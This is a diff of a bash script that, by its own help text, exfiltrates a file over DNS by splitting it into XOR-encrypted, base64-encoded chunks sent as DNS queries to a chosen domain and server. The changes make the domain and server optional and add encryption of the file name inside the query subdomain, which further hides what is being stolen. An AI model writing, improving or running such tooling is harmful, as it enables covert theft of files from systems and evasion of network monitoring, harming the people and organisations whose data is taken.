@@ -1,14 +1,14 @@
 #!/bin/bash
 
 function show_help {
-    echo "Usage: $0 -f <file_path> -d <domain> -s <dns_server_ip> -p <password> [-t]"
+    echo "Usage: $0 -f <file_path> -p <password> [-d <domain>] [-s <dns_server_ip>]  [-t]"
     echo "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
     echo ""
     echo "Parameters:"
     echo "  -f   Path to the file you want to exfiltrate."
+    echo "  -p   Password to be used in XOR encryption."
     echo "  -d   Domain to use in DNS queries."
     echo "  -s   IP address of the DNS server."
-    echo "  -p   Password to be used in XOR encryption."
     echo "  -t   Optional flag to use TCP instead of UDP."
     echo ""
     echo "Example:"
@@ -29,7 +29,7 @@ while getopts "f:d:s:p:t" opt; do
 done
 
 # Check if all required parameters are provided
-if [ -z "$FILE_PATH" ] || [ -z "$DOMAIN" ] || [ -z "$DNS_SERVER_IP" ] || [ -z "$PASSWORD" ]; then
+if [ -z "$FILE_PATH" ] || [ -z "$PASSWORD" ]; then
     show_help
     exit 1
 fi
@@ -108,7 +108,9 @@ while [ $chunk_id -lt $nb_chunks ]; do
     done
 
     # Construct DNS query
-    hex_filename=$(echo -n "$filename" | od -An -t x1 | tr -d ' \n')
+    encrypted_filename=($(xor_encrypt "${filename}"))
+    hex_filename=$(printf "%02X" "${encrypted_filename[@]}")
+
     metadata="${hex_filename}|${timestamp}|${nb_chunks}"
     subdomain="${chunk_id}.${chunks[0]}.${chunks[1]}.${chunks[2]}.${chunks[3]}.${metadata}.${DOMAIN}"
 
